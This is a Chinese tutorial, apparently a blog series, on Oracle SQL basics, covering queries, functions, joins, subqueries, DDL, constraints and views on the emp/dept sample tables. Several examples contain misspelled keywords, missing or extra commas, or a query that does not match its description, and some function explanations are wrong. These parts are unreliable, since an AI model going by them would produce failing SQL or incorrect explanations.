class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">select 列名 from 表名 ；</span><br><span class="line">where 查询条件</span><br><span class="line">group by 分组列</span><br><span class="line">having 分组后条件</span><br><span class="line">order by 排序列 asc[desc]</span><br></pre>      </td>    </tr>  </table></figure><p>如：查询部门10的雇员</p><pre><code>select * from emp where deptno=10;</code></pre><h2 id="行号-rownum">行号（rownum）</h2><p><strong>每个表都有一个虚列ROWNUM，它用来显示结果中记录的行号。我们在查询中也可以显示这个列。</strong></p><p>如：显示emp表的行号</p><pre><code>select rownum,ename from emp;</code></pre><p>如：显示前三行</p><pre><code>select * from emp where rownum&lt;=3;</code></pre><h2 id="查询进行计算">查询进行计算</h2><p>如：显示雇员工资上浮20%的结果</p><pre><code>select ename,sal,sal*(1+20%) from emp;</code></pre><p>如：显示每个员工的总工资（工资+奖金）</p><pre><code>update emp set comm = o where comm is null;    //因为null的特殊性，它与任何值运算都等于null，所以先要把它更新为0，后面我们会学到一个函数来处理null值select ename,sal+comm from emp;</code></pre><h2 id="使用别名">使用别名</h2><p>如：在查询中使用列别名</p><pre><code>select ename as 名称，sal as 工资 from emp; //建议省略as</code></pre><p><em>另，在别名为关键字或有特殊符号时需要加双引号</em></p><p>如：</p><pre><code>select ename as &quot;select&quot;,sal*12+5000 as &quot;年度工资（加年终奖）&quot; from emp;</code></pre><h2 id="连接运算符">连接运算符</h2><p><strong>连接运算符是双竖线“||”。通过连接运算可以将两个字符串连接在一起。</strong></p><p>如：在查询中使用连接运算</p><pre><code>select ename||job as &quot;雇员和职务表&quot; from emp;</code></pre><p>*注意：‘5’||5结果为’55’    ‘5’+5结果为 10 *</p><h2 id="六-消除重复行-distinct">六、消除重复行（distinct）</h2><p><strong>如果在显示结果中存在重复行，可以使用关键字<code>distinct</code>消除重复显示</strong></p><p>如：统计职务的数量</p><pre><code>select count(distinct job) from emp;</code></pre><h2 id="排序">排序</h2><p><strong>1、升序（默认为升序<code>asc</code>,所以可以忽略）</strong></p><p>如：查询雇员姓名和工资，并按工资从小到大排序</p><pre><code>select ename,sal from emp order by sal asc;</code></pre><p><strong>2、降序（<code>desc</code>不可忽略）</strong></p><p>如：查询雇员姓名和雇佣日期，并按雇佣日期排序，后雇佣的先显示</p><pre><code>select ename,hiredate from emp order by hiredate desc;</code></pre><p><strong>3、多列排序</strong></p><p><em>可以按多列进行排序，先按第一列，然后按第二列、第三列…。</em></p><p>如：查询雇员信息，先按部门从小到大排序，再按雇佣时间的先后排序</p><pre><code>select ename,deptno,hiredate from emp order by deptno hiredate;</code></pre><h1>Oracle第四章——条件查询、字符型函数</h1><h2 id="条件查询">条件查询</h2><p><strong>1、模糊查询(between、in、like)</strong></p><p>A、between：在某某之间。如,显示工资在1000~2000之间的雇员</p><pre><code>select * from emp where sal beteween 1000 and 2000;</code></pre><p>B、in：在某某之间。如，显示职务为“SALMAN”，“CLEARK”和“MANAGER”的雇员信息</p><pre><code>select * from emp where job in ('SALMAN','CLERK','MANAGER');</code></pre><p>C、like：与通配符使用</p><p><em>通配符：% 代表0个或任意个字符     —_ 代表1个字符</em></p><p>如：显示姓名以“S”开头的雇员信息。</p><pre><code>select * from emp where ename like 'S%';</code></pre><p>显示姓名第二个字符为“A”的雇员信息</p><pre><code>select * from emp ename like '_A%';</code></pre><p><strong>2、空值查询</strong></p><p><em>空：is null      非空： is not null</em></p><p>如：查询奖金为空的雇员信息</p><pre><code>select * from emp where comm is null;</code></pre><h2 id="函数">函数</h2><p><strong>1、数学函数</strong></p><table>  <tr>    <td>函数</td>    <td>功能</td>    <td>实例</td>    <td>结果</td>  </tr>  <tr>    <td>abs</td>    <td>求绝对值函数</td>    <td>abs(-5)</td>    <td>5</td>  </tr>  <tr>    <td>sqrt</td>    <td>求平方根</td>    <td>sqrt(2)</td>    <td>1.414</td>  </tr>  <tr>    <td>power</td>    <td>求幂函数</td>    <td>power(2,3)</td>    <td>8</td>  </tr></table><p>使用求绝对值函数abs</p><pre><code>select abs(-5) from dual;</code></pre><p>使用求平方根函数sqrt。</p><pre><code>select sqrt(2) from dual;</code></pre><p>使用ceil函数。</p><pre><code>select ceil(2.35) from dual;</code></pre><p>使用floor函数。</p><pre><code>select floor(2.35) from dual;</code></pre><p><strong>2、使用四舍五入函数round</strong> <small> 格式：round(数字，保留的位数)</small></p><pre><code>select round(45.923,2), round(45.923,0), round(45.923,-1) from dual;</code></pre><p><strong>3、字符型函数</strong></p><table><tr><td>ascii</td><td>返回与ASCII码相应的字符</td><td>Ascii('A')</td><td>65</td></tr><td>char</td><td>返回与ASCII码相应的字符</td><td>char(65)</td><td>A</td><tr><td>lower</td><td>将字符串转换成小写</td><td>lower ('SQL Course')</td><td>sql course</td></tr><tr><td>upper</td><td>将字符串转换成</td><td>upper('SQL Course')</td><td>SQL COURSE</td></tr><tr><td>initcap</td><td>将字符串转换成每个单词以大写开头</td><td>initcap('SQL course')</td><td>SQL Course</td></tr><tr><td>concat</td><td>连接两个字符串</td><td>concat('SQL', ' Course')</td><td>SQL Course</td></tr><tr><td>substr</td><td>给出起始位置和长度，返回子字符串</td><td>substr('String',1,3)</td><td>Str</td></tr><tr><td>length</td><td>求字符串的长度</td><td>length('Wellcom')</td><td>7</td></tr><tr><td>trim</td><td>在一个字符串中去除另一个字符串</td><td>trim('S' FROM 'SSMITH')</td><td>MITH</td></tr><tr><td>replace</td><td>用一个字符串替换另一个字符串中的子字符串</td><td>replace('ABC', 'B', 'D')</td><td>ADC</td></tr></table><p>如果不知道表的字段内容是大写还是小写，可以转换后比较。</p><pre><code>select empno, ename,deptno from emp where lower(ename)='blake';</code></pre><p>显示名称以“W”开头的雇员，并将名称转换成以大写开头。</p><pre><code>select empno,initcap(ename),job from emp wher substr(ename,1,1)='W';</code></pre><p>显示雇员名称中包含“S”的雇员名称及名称长度。</p><pre><code>select empno,ename,legth(ename) from emp where instr(ename,'S',1,1)&gt;0;</code></pre><h1>Oracle第五章——函数</h1><h2 id="日期型函数">日期型函数</h2><p><strong>Oracle使用内部数字格式来保存时间和日期，包括世纪、年、月、日、小时、分、秒。缺省日期格式为 DD-MON-YY，如“08-05月-03”代表2003年5月8日。</strong></p><ul><li>SYSDATE：返回系统日期和时间的虚列函数。</li></ul><p>如：返回系统的当前日期。</p><pre><code>SELECT sysdate FROM dual;</code></pre><ul><li>对两个日期相减，得到相隔天数。</li></ul><p><em>通过加小时来增加天数，24小时为一天，如12小时可以写成12/24(或0.5)。</em></p><p>如：例1 假定当前的系统日期是2003年2月6日，求再过1000天的日期。</p><pre><code>SELECT sysdate+1000 AS &quot;NEW DATE&quot; FROM dual;</code></pre><p>例2：两个日期相减</p><pre><code> select to_date('1-1月-2000') - to_date('1-8月-1999') from dual;</code></pre><ul><li>其它日期函数</li></ul><table><thead><tr><th>函数</th><th>功能</th><th>实例</th><th>结果</th></tr></thead><tbody><tr><td>months_between</td><td>返回两个日期间的月份</td><td>months_between (‘04-11月-05’,‘11-1月-01’)57.7741935</td><td></td></tr><tr><td>add_months</td><td>返回把月份数加到日期上的新日期</td><td>add_months(‘06-2月-03’,1)，add_months(‘06-2月-03’,-1)</td><td>06-3月-03，06-1月-03</td></tr><tr><td>next_day</td><td>返回指定日期后的星期对应的新日期</td><td>next_day(‘06-2月-03’,‘星期一’)</td><td>10-2月-03</td></tr><tr><td>last_day</td><td>返回指定日期所在的月的最后一天</td><td>last_day(‘06-2月-03’)</td><td>28-2月-03</td></tr><tr><td>round</td><td>按指定格式对日期进行四舍五入</td><td>round(to_date(‘13-2月-03’),‘YEAR’)，round(to_date(‘13-2月-03’),‘MONTH’)，round(to_date(‘13-2月-03’),‘DAY’)</td><td>01-1月-03，01-2月-03，16-2月-03(按周四舍五入)</td></tr></tbody></table><p>如：返回2003年2月的最后一天。</p><pre><code>SELECT last_day('08-2月-03') FROM dual;</code></pre><p>假定当前的系统日期是2003年2月6日，显示部门10雇员的雇佣天数。</p><pre><code>SELECT ename, round(sysdate-hiredate) DAYS FROM emp WHERE  deptno = 10;</code></pre><h2 id="转换函数">转换函数</h2><table><thead><tr><th>函数</th><th>功能</th><th>实例</th><th>结果</th></tr></thead><tbody><tr><td>To_char</td><td>转换成字符串类型</td><td>To_char(1234.5, ‘$9999.9’)</td><td>$1234.5</td></tr><tr><td>To_date</td><td>转换成日期类型</td><td>To_date(‘1980-01-01’, ‘yyyy-mm-dd’)</td><td>01-1月-80</td></tr><tr><td>To_number</td><td>转换成数值类型</td><td>To_number(‘1234.5’)</td><td>1234.5</td></tr></tbody></table><ul><li>自动类型转换</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;12.5&apos;+11 FROM dual;    //结果为：23.5</span><br><span class="line">Select  ‘12.5’||11 from dual;    //结果为：’12.511’</span><br></pre></td></tr></table></figure><ul><li>日期类型转换</li></ul><table><thead><tr><th>代码</th><th>代表的格式</th><th>例子</th></tr></thead><tbody><tr><td>AM、PM</td><td>上午、下午</td><td>08 AM</td></tr><tr><td>D</td><td>数字表示的星期(1～7)</td><td>1,2,3,4,5,6,7</td></tr><tr><td>DD</td><td>数字表示月中的日期(1～31)</td><td>1,2,3,…,31</td></tr><tr><td>MM</td><td>两位数的月份</td><td>01,02,…,12</td></tr><tr><td>Y、YY、YYY、YYYY</td><td>年份的后几位</td><td>3,03,003,2003</td></tr><tr><td>RR</td><td>解决Y2K问题的年度转换</td><td></td></tr><tr><td>DY</td><td>简写的星期名</td><td>MON,TUE,FRI,…</td></tr><tr><td>DAY</td><td>全拼的星期名</td><td>MONDAY,TUESDAY,…</td></tr><tr><td>MON</td><td>简写的月份名</td><td>JAN,FEB,MAR,…</td></tr><tr><td>MONTH</td><td>全拼的月份名</td><td>JANUARY,FEBRUARY,…</td></tr><tr><td>HH、HH12</td><td>12小时制的小时(1～12)</td><td>1,2,3,…,12</td></tr><tr><td>HH24</td><td>24小时制的小时(0～23)</td><td>0,1,2,…,23</td></tr><tr><td>MI</td><td>分(0～59)</td><td>0,1,2,…,59</td></tr><tr><td>SS</td><td>秒(0～59)</td><td>0,1,2,…,59</td></tr><tr><td>,./-;:</td><td>原样显示的标点符号</td><td></td></tr><tr><td>‘TEXT’</td><td>引号中的文本原样显示</td><td>TEXT</td></tr></tbody></table><p>如：1、日期型转字符型</p><p>将日期转换成带时间和星期的字符串并显示。</p><pre><code>SELECT TO_CHAR(sysdate,'YYYY-MM-DD HH24:MI:SS AM DY') FROM dual;</code></pre><p>将日期显示转换成中文的年月日。</p><pre><code>SELECT TO_CHAR(sysdate,'YYYY&quot;年&quot;MM&quot;月&quot;DD&quot;日&quot;') FROM dual;</code></pre><p>2.字符型转日期型</p><p>往emp表中插入一条记录</p><pre><code>insert into emp values(8888,'张三','CLERK',7369,to_date('1-1月-2000'),1000,10,10);insert into emp values(8889,'李四','CLERK',7369,to_date('2000-01-01','YYYY-MM-DD'),1000,10,10);</code></pre><h2 id="其他常用函数">其他常用函数</h2><table><thead><tr><th>函数</th><th>功能</th><th>实例</th><th>结果</th></tr></thead><tbody><tr><td>nvl</td><td>空值转换函数</td><td>nvl(null, ‘空’)</td><td>空</td></tr><tr><td>decode</td><td>实现分支功能</td><td>decode(1,1, ‘男’, 2, ‘女’)</td><td>男</td></tr><tr><td>userenv</td><td>返回环境信息</td><td>userenv(‘LANGUAGE’)</td><td>SIMPLIFIED CHINESE_CHINA.ZHS16GBK</td></tr><tr><td>greatest</td><td>返回参数的最大值</td><td>greatest(20,35,18,9)</td><td>35</td></tr><tr><td>least</td><td>least返回参数的最小值</td><td>least(20,35,18,9)</td><td>9</td></tr></tbody></table><h3 id="1-空值的转换">1．空值的转换</h3><p><em>如果对空值NULL不能很好的处理，就会在查询中出现一些问题。在一个空值上进行算术运算的结果都是NULL。最典型的例子是，在查询雇员表时，将工资sal字段和津贴字段comm进行相加，如果津贴为空，则相加结果也为空，这样容易引起误解。</em></p><p><strong>使用nvl函数，可以转换NULL为实际值。该函数判断字段的内容，如果不为空，返回原值；为空，则返回给定的值。</strong></p><p>如下3个函数，分别用新内容代替字段的空值：</p><pre><code>nvl(comm, 0)：用0代替空的Comm值。nvl(hiredate, '01-1月-97')：用1997年1月1日代替空的雇佣日期。nvl(job, '无')：用“无”代替空的职务。</code></pre><p>使用nvl函数转换空值。</p><pre><code>SELECTename,nvl(job,'无'),nvl(hiredate,'01-1月-97'),nvl(comm,0) FROM emp;</code></pre><h3 id="2-decode函数">2．decode函数</h3><p><em>decode函数可以通过比较进行内容的转换，完成的功能相当于分支语句。在参数的最后位置上可以存在单独的参数，如果以上比较过程没有找到匹配值，则返回该参数的值，如果不存在该参数，则返回NULL。</em></p><p>将职务转换成中文显示。</p><pre><code>SELECTename,decode(job, 'MANAGER', '经理', 'CLERK','职员', 'SALESMAN','推销员', 'ANALYST','系统分析员','未知') FROM emp;</code></pre><h3 id="3-最大-最小值函数">3．最大、最小值函数</h3><p><em>greatest返回参数列表中的最大值，least返回参数列表中的最小值。</em></p><p><strong>如果表达式中有NULL，则返回NULL。</strong></p><h1>Oracle第六章——相等、外连接</h1><h2 id="相等连接">相等连接</h2><h3 id="1-三个步骤">1、三个步骤</h3><p>A、先列出要显示的列： select ename,job,comm,emp,deptno,dname</p><p>B、列出查询的表： from emp,dept</p><p>C、列出多表相连条件（主外键）：where emp.deptno=dept.deptno</p><p><em>注意：如果两个表有同名列，那么前面必须接表名 如： emp.deptno ,如果不是同名字段则表名可以省略</em></p><h3 id="2-inner-join-的写法">2、inner join 的写法</h3><pre><code>select enaem,job,sal,comm,emp.deptno,dname from emp inner join dept on emp.deptno = dept.deptno;</code></pre><h3 id="3-三表或三表以上的写法">3、三表或三表以上的写法</h3><pre><code>select 字段1，字段2 , 字段3 。。。。from 表1，表2，表3.。。where 表1.外键 = 表2.主键  and 表1.外键 = 表3.主键 and 。。。</code></pre><p><em>注意：两个表有一个条件 ，三个表有两个条件 ，四个表有三个条件 以此类推</em></p><h2 id="外连接-不等连接">外连接（不等连接）</h2><p><em>左外连接即在内连接的基础上，左边表中有但右边表中没有的记录也以null的形式显示出来，右外连接则反之</em></p><h3 id="1-写法1">1、写法1</h3><p><em>(右外连接)</em></p><pre><code>select ename,d.deptno,dname from emp e,dept d where e.deptno(+) = d.deptno</code></pre><p><em>(左外连接)</em></p><pre><code>select ename,d.deptno,dname from emp e,dept d where d.deptno = e.deptno(+)    </code></pre><h3 id="2-写法2">2、写法2</h3><pre><code>select ename,d.deptno,dname from emp e right join dept d on e.deptno = d.deptno  </code></pre><h1>Oracle第七章——连接、分组查询</h1><h2 id="不等连接">不等连接</h2><p><strong>拿一个表作为另一表的查询条件或范围</strong></p><p>如：显示雇员名称，工资和所属工资等级。</p><pre><code>select e.ename,e.sal,s.grade from emp e,salgrade s where e.sal between s.losal and s.hisal;</code></pre><h2 id="自连接">自连接</h2><p><strong>自连接就是一个表，同本身进行连接。对于自连接可以想像存在两个相同的表(表和表的副本)，可以通过不同的别名区别两个相同的表（其它就是内连接)</strong></p><p>如：显示雇员名称和雇员的经理名称</p><pre><code>select worker.ename||'的经理是'||manager.ename as 雇员经理 from emp worker,emp manager where worker.mgr=manager.empno;</code></pre><h2 id="组函数">组函数</h2><ul><li>组函数只能应用于SELECT子句、HAVING子句或ORDER BY子句中。</li><li>组函数也可以称为统计函数。</li><li>组函数忽略列的空值。</li><li>对组可以应用组函数。</li><li>在组函数中可使用DISTINCT或ALL关键字。</li><li>ALL表示对所有非NULL值(可重复)进行运算。</li><li>DISTINCT 表示对每一个非NULL值，如果存在重复值，则组函数只运算一次。如果不指明上述关键字，默认为ALL。</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>AVG</td><td>求平均值</td></tr><tr><td>COUNT</td><td>求计数值，返回非空行数，*表示返回所有行</td></tr><tr><td>MAX</td><td>求最大值</td></tr><tr><td>MIN</td><td>求最小值</td></tr><tr><td>SUM</td><td>求和</td></tr><tr><td>SIDDEV</td><td>求标准偏差，是根据差的平方根得到的</td></tr><tr><td>VARIANCE</td><td>求统计方差</td></tr></tbody></table><h2 id="分组查询">分组查询</h2><p><strong>1、如：按职务统计工资总和。</strong></p><pre><code>select deptno,job,sum(sal) from emp group by deptno,job;</code></pre><p><strong>2、多列分组</strong></p><p>如：按部门和职务分组统计工资总和:</p><pre><code>select deptno,job,sum(sal) from emp group by deptno,job;</code></pre><p><strong>3、HAVING</strong></p><p><em>HAVING从句过滤分组后的结果，它只能出现在GROUP BY从句之后，而WHERE从句要出现在GROUP BY从句之前。</em></p><p>如：统计各部门的最高工资，排除最高工资小于3000的部门。</p><pre><code>select deptno,max(sal) from emp group by deptno having max(sal)&gt;=3000;</code></pre><p><strong>4、分组统计结果排序</strong></p><p><em>可以使用ORDER BY从句对统计的结果进行排序，ORDER BY从句要出现在语句的最后。</em></p><p>如：按职务统计工资总和并排序。</p><pre><code>select job 职务, sum(sal) 工资总和 from emp group by job order by sum(sal);</code></pre><p><strong>5、组函数的嵌套使用</strong></p><p>如：求各部门平均工资的最高值。</p><pre><code>select max(avg(sal)) from emp group by deptno;</code></pre><h1>Oracle第八章——子查询</h1><h2 id="子查询">子查询</h2><p><strong>通过把一个查询的结果作为另一个查询的一部分,子查询一般出现在SELECT语句的WHERE子句中，Oracle也支持在FROM或HAVING子句中出现子查询。子查询比主查询先执行，结果作为主查询的条件，在书写上要用圆括号扩起来，并放在比较运算符的右侧。</strong></p><h3 id="1-单行子查询">1、单行子查询</h3><p>如：查询比SCOTT工资高的雇员名字和工资。</p><pre><code>select ename,sal from emp where sal&gt;(select sal from emp where empno=7788);</code></pre><h3 id="2-多行子查询">2、多行子查询*</h3><p><strong>如果子查询返回多行的结果，则我们称它为多行子查询。多行子查询要使用不同的比较运算符号，它们是IN、ANY和ALL。</strong></p><p>如:查询工资低于任意一个“CLERK”的工资的雇员信息。</p><pre><code>select empno,ename,job,sal from emp where sal &lt; any (select sal from emp where job = 'CLERK') and job &lt;&gt; 'CLERK';</code></pre><p>如：查询工资比所有的“SALESMAN”都高的雇员的编号、名字和工资。</p><pre><code>select empno,ename,job from emp where job in (select job from emp where deptno = 10) and deptno = 20;</code></pre><h3 id="3-多列子查询">3.多列子查询</h3><p>**如果子查询返回多列，则对应的比较条件中也应该出现多列，这种查询称为多列子查询。以下是多列子查询的训练实例。**如： 查询职务和部门与SCOTT相同的雇员的信息。</p><pre><code>select empno, ename,sal from emp where (job,deptno) = (select job,deptno from emp where empno = 7788);</code></pre><h3 id="4-在from从句中使用子查询">4．在FROM从句中使用子查询</h3><p><strong>在FROM从句中也可以使用子查询，在原理上这与在WHERE条件中使用子查询类似。有的时候我们可能要求从雇员表中按照雇员出现的位置来检索雇员，很容易想到的是使用rownum虚列。比如我们要求显示雇员表中6～9位置上的雇员，可以用以下方法</strong></p><p>如：查询雇员表中排在第6～9位置上的雇员。</p><pre><code>select ename, sal, from (select rownum as num,ename,sal from emp where rownum&lt;=9) where num&gt;=6;</code></pre><h2 id="集合运算">集合运算</h2><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>union</td><td>并集，合并两个操作的结果，去掉重复的部分</td></tr><tr><td>union all</td><td>并集，合并两个操作的结果，保留重复的部分</td></tr><tr><td>minus</td><td>差集，从前面的操作结果中去掉与后面操作结果相同的部分</td></tr><tr><td>intersect</td><td>交集，取两个操作结果中相同的部分</td></tr></tbody></table><p>如：查询部门10和部门20的所有职务。</p><pre><code>select job from emp where deptno = 10 unionselect job from emp where deptno = 20;</code></pre><p>如：查询只在部门表中出现，但没有在雇员表中出现的部门编号。</p><pre><code>select deptno from deptminusselect deptno from emp;</code></pre><h1>Oracle第九章——增删改、序列、事务</h1><h2 id="增删改">增删改</h2><p>增： <code>insert into 表名(列名) values (值)；</code></p><p>删： <code>delete from 表名 where 条件；</code></p><p>改： <code>update 表名 set 列名1=值1，列名2=值2... where 条件；</code></p><h2 id="复制数据">复制数据</h2><p><strong>1、通过一条查询语句创建一个新表(要求目标表不存在)</strong></p><pre><code>create table manager as select empno,ename,sal, from emp where job= 'CLERK';</code></pre><p><strong>2、通过一条查询语句复制数据(要求目标表必须已建好)</strong></p><pre><code>insert into manager select empno,ename,sal from emp where job = 'CLERK';</code></pre><h2 id="序列">序列</h2><h3 id="1-创建序列">1、创建序列</h3><p>如：创建从2000起始，增量为1 的序列abc：</p><pre><code>create sequence abc increment by 1 start with 2000maxvalue 99999 cycle nocache;</code></pre><h3 id="2-使用序列">2、使用序列</h3><p>序列名.nextval: 代表下一个值</p><p>序列名.currval: 代表当前值</p><p>如：</p><pre><code>insert into manager values(abc.nextval,'小王',2500);insert into manager values(abc.nextval,'小赵'，2800);</code></pre><h2 id="事务">事务</h2><p>    <strong>两次连续成功的COMMIT或ROLLBACK之间的操作，称为一个事务。在一个事务内，数据的修改一起提交或撤销，如果发生故障或系统错误，整个事务也会自动撤销</strong><br>    <strong>数据库事务处理可分为隐式和显式两种。显式事务操作通过命令实现，隐式事务由系统自动完成提交或撤销(回退)工作，无需用户的干预。</strong></p><p>1、隐式提交的情况包括：</p><p>    当用户正常退出SQL*Plus或执行CREATE、DROP、GRANT、REVOKE等命令时会发生事务的自动提交。</p><p>2、显示事务:</p><pre>COMMIT        数据库事务提交，将变化写入数据库ROLLBACK数据库事务回退，撤销对数据的修改SAVEPOINT创建保存点，用于事务的阶段回退</pre><h1>Oracle第十章————建表</h1><h2 id="建表">建表</h2><p>格式：</p><pre>create table 表名      (  列名1   类型   约束,  列名2   类型   约束,  ......      );</pre><p>如：</p><p>– 创建出版社表</p><pre><code>create table 出版社（编号 varchar2(2),出版社名称 varchar2(30),地址 varchar2(30),联系电话 varchar2(20)）;</code></pre><p>– 创建图书表</p><pre><code>create table 图书 (图书编号 VARCHAR2(5),图书名称 VARCHAR2(30),出版社编号 VARCHAR2(2),作者 VARCHAR2(10),出版日期 DATE,数量 NUMBER(3),单价 NUMBER(7,2));</code></pre><h2 id="通过子查询建表">通过子查询建表</h2><p>步骤1：完全复制图书表到“图书1”</p><pre><code>create table 图书1 as select * from 图书;</code></pre><p>步骤2：创建新的图书表“图书2”，只包含书名和单价</p><pre><code>create table 图书2（书名，单价） as seelct 图书名称，单价 from 图书；</code></pre><p>步骤3：创建新的图书表“图书3”，只包含书名和单价，不复制内容</p><pre><code>create table 图书3（书名，单价） as select 图书名称，单价 from 图书 where 1=2；</code></pre><h2 id="添加表的约束">添加表的约束</h2><pre>主键     primary key      PK唯一     unique           UQ默认值   default          DF检查约束 check            CK外键约束 foreign key      FK</pre><h3 id="方法一：建表的同时添加约束">方法一：建表的同时添加约束</h3><p>如：</p><pre>create table stuinfo( sno int primary key not null,       --主键 sname varchar2(10) unique not null,       --唯一 sex char(2) default '男' check(sex='男' or sex = '女') not null,   --默认及检查 saddress varchar2(50) not null, phone char(11), email varchar2(50));create table stumarks( marksId int, sno int references stuinfo(sno) not null,     --外键 score number(5,1), examDate date default sysdate);</pre><h3 id="方法二：建表完成后-再添加约束">方法二：建表完成后，再添加约束</h3><p>如：（之前已建好了出版社表及图书表）</p><p>–主键约束</p><pre><code>alter table 出版社 add constraint PK_编号 primary key (编号);</code></pre><p>–唯一约束</p><pre><code>alter table 出版社 add constraint UQ_地址 unique (地址);</code></pre><p>–检查约束</p><pre><code>alter table 出版社 add constraint CK_联系电话 check (联系电话 like '1%');</code></pre><p>–默认值</p><pre><code>alter table 出版社 modify 地址 default '湘潭';</code></pre><p>–外键约束</p><pre><code>alter table 图书 add constraint FK_图书编号 foreign key (图书编号) references 出版社(编号);</code></pre><p>–外键约束</p><pre><code>alter table 图书 add constraint FK_图书编号 foreign key (图书编号) references 出版社(编号);</code></pre><h2 id="查看约束条件">查看约束条件</h2><p><strong>数据字典<code>USER_CONSTRAINTS</code>中包含了当前模式用户的约束条件信息。其中，CONSTRAINTS_TYPE 显示的约束类型为：</strong></p><pre>C：CHECK约束。P：PRIMARY KEY约束。U：UNIQUE约束。R：FOREIGN KEY约束。</pre><p><em>其他信息可根据需要进行查询显示，可用DESCRIBE命令查看<code>USER_CONSTRAINTS的</code>结构。</em></p><p>如:检查表的约束信息：</p><pre><code>SELECT CONSTRAINT_NAME,CONSTRAINT_TYPE,SEARCHCONDITONFROM USER_CONSTRAINTSWHERE TABLE_NAME='图书';</code></pre><h2 id="删除约束条件">删除约束条件</h2><pre><code>ALTER TABLE 表名 DROP CONSTRAINT 约束名;</code></pre><h2 id="表的操作">表的操作</h2><pre>1、删除表    drop table 表名2、重命名表  RENAME 表名 TO 新表名;3、查看表</pre><p><em>可以通过对数据字典<code>USER_OBJECTS</code>的查询，显示当前模式用户的所有表。</em></p><p>如： 显示当前用户的所有表。</p><pre><code>SELECT object_name FROM user_objects WHERE object_type='TABLE';</code></pre><h2 id="修改表">修改表</h2><h3 id="1-增加新列">1、增加新列:</h3><p>如： 为“出版社”增加一列“电子邮件”：</p><pre><code>ALTER TABLE 出版社ADD 电子邮件 VARCHAR2(30) CHECK(电子邮件 LIKE '%@%');</code></pre><h3 id="2-修改列">2、修改列</h3><p>修改列定义有以下一些特点：</p><pre>(1) 列的宽度可以增加或减小，在表的列没有数据或数据为NULL时才能减小宽度。(2) 在表的列没有数据或数据为NULL时才能改变数据类型，CHAR和VARCHAR2之间可以随意转换。(3) 只有当列的值非空时，才能增加约束条件NOT NULL。(4) 修改列的默认值，只影响以后插入的数据。如：修改“出版社”表“电子邮件”列的宽度为40。</pre><pre><code>ALTER TABLE 出版社 MODIFY 电子邮件 VARCHAR2(40);</code></pre><h3 id="3-删除列">3、删除列</h3><p>如：删除“出版社”表的“电子邮件”列。</p><pre><code>ALTER TABLE 出版社 DROP COLUMN 电子邮件;</code></pre><h1>Oracle第十一章————视图</h1><h2 id="分区表">分区表</h2><p><strong>在某些场合会使用非常大的表，比如人口信息统计表。如果一个表很大，就会降低查询的速度，并增加管理的难度。一旦发生磁盘损坏，可能整个表的数据就会丢失，恢复比较困难。根据这一情况，可以创建分区表，把一个大表分成几个区(小段)，对数据的操作和管理都可以针对分区进行，这样就可以提高数据库的运行效率。分区可以存在于不同的表空间上，提高了数据的可用性。例：创建和使用分区表。</strong></p><p>如：创建按成绩分区的考生表，共分为3个区：</p><pre>CREATE TABLE 考生 (考号 VARCHAR2(5),姓名 VARCHAR2(30),成绩 NUMBER(3))PARTITION BY RANGE(成绩)(PARTITION A VALUES LESS THAN (300)TABLESPACE USERS,PARTITION B VALUES LESS THAN (500)TABLESPACE USERS,PARTITION C VALUES LESS THAN (MAXVALUE)TABLESPACE USERS);</pre><p>步骤3：检查A区中的考生：</p><pre><code>SELECT *  FROM  考生 PARTITION(A);</code></pre><p>步骤4：检查全部的考生：</p><pre><code>SELECT *  FROM  考生;</code></pre><h2 id="视图">视图</h2><h3 id="1-视图的概念">1、视图的概念</h3><p>视图不同于表，视图本身不包含任何数据。而视图只是一种定义，对应一个查询语句。视图的数据都来自于某些表，这些表被称为基表。</p><p>视图可以在表能够使用的任何地方使用，但在对视图的操作上同表相比有些限制，特别是插入和修改操作。对视图的操作将传递到基表，所以在表上定义的约束条件和触发器在视图上将同样起作用。2、视图的创建</p><h3 id="2-格式：">2、格式：</h3><pre><code>create [or replace] view 视图名 asselect 语句;</code></pre><p>例：创建图书作者视图：</p><pre><code>CREATE VIEW 图书作者(书名,作者) AS SELECT 图书名称,作者 FROM 图书;</code></pre><p>查询视图全部内容</p><pre><code>SELECT * FROM 图书作者;    </code></pre><p>查询部分视图：</p><pre><code>SELECT 作者 FROM 图书作者;</code></pre><p>删除视图：</p><pre><code>DROP VIEW 清华图书;</code></pre><h3 id="3-创建只读视图">3．创建只读视图</h3><p>创建只读视图要用<code>WITH READ ONLY</code>选项。</p><p>例：创建emp表的经理视图：</p><pre><code>CREATE OR REPLACE VIEW manager AS SELECT * FROM emp WHERE job= 'MANAGER'WITH READ ONLY;</code></pre><h3 id="4-使用with-check-option选项">4．使用WITH CHECK OPTION选项</h3><p>使用<code>WITH CHECK OPTION</code>选项。使用该选项，可以对视图的插入或更新进行限制，即该数据必须满足视图定义中的子查询中的WHERE条件，否则不允许插入或更新。</p><p>例：</p><pre><code>CREATE OR REPLACE VIEW 清华图书 AS SELECT * FROM 图书 WHERE 出版社编号= '01'</code></pre><p><em>WITH CHECK OPTION;注：插入数据时，由于带了with check option的选项，则只能插入出版社编为’01’的数据</em></p><h3 id="5-来自基表的限制">5．来自基表的限制</h3><p>除了以上的限制，基表本身的限制和约束也必须要考虑。如果生成子查询的语句是一个分组查询，或查询中出现计算列，这时显然不能对表进行插入。另外，主键和NOT NULL列如果没有出现在视图的子查询中，也不能对视图进行插入。在视图中插入的数据，也必须满足基表的约束条件。</p><h3 id="6-视图的查看">6.视图的查看</h3><p><code>USER_VIEWS</code>字典中包含了视图的定义。</p><p><code>USER_UPDATABLE_COLUMNS</code>字典包含了哪些列可以更新、插入、删除。</p><p><code>USER_OBJECTS</code>字典中包含了用户的对象。</p><p>可以通过<code>DESCRIB</code>E命令查看字典的其他列信息。</p><p>例：查看用户拥有的视图：</p><pre><code>SELECT object_name FROM user_objects WHERE object_type='VIEW';</code></pre><h1>Oracle第十二章——索引、同义词、数据库链接、PL/SQL语句</h1><h2 